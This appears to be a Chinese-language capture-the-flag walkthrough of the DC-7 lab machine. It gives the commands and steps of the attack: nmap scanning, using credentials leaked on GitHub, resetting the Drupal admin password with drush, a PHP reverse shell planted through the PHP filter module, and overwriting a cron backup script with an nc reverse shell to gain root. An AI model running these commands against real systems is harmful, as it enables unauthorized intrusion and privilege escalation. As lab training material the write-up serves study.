# DC-7
nmap扫描
```
nmap -A -T4 192.168.111.140
```
![](vx_images/61428498856158.png)
访问80端口
Dprual站点,目录扫描也没什么有价值的东西,
这次要用到社工信息收集
页面下方作者署名,再github上找到仓库
![](vx_images/49434818420940.png)
发现一段代码
![](vx_images/536104597518587.png)
可能存在文件包含漏洞
访问发现404,那么可以利用,但被限制还是不行
发现敏感文件
![](vx_images/162646605123645.png)
3306没有对外开放
试一下ssh登录
![](vx_images/599565353599893.png)
成功登录
看了下suid,没有什么可以利用的
![](vx_images/47167980249289.png)
提示一封邮件信息
打开查看,发现.sh执行文件/opt/scripts/backups.sh
![](vx_images/581726340505881.png)
ls -al查看
![](vx_images/257353056171709.png)
能用来提权,但是需要网站权限ww-data
那么需要降权,目前是普通用户
一个思路:上传webshell到网站目录,获得www-data权限
修改后台密码
mysql连接数据库还不行
![](vx_images/434743084924626.png)
看了一下,要用drush命令修改
```
drush user-password admin --password="admin"
```
进入后台
来到moudle
添加模块包
```
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
```
![](vx_images/599727680999861.png)
![](vx_images/578277982917230.png)
安装成功后启用
![](vx_images/141611953582028.png)

添加信页面,写入反弹shell
```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.111.128/4444 0>&1'");
?>
```
选择php code模块
![](vx_images/135632553687666.png)
访问触发代码

![](vx_images/472774064182284.png)
获得www权限后修改脚本文件,等待计划任务的执行,就能获取root权限
```
echo 'nc -e /bin/bash 192.168.111.128 5555' >backups.sh
```
![](vx_images/61096716352417.png)

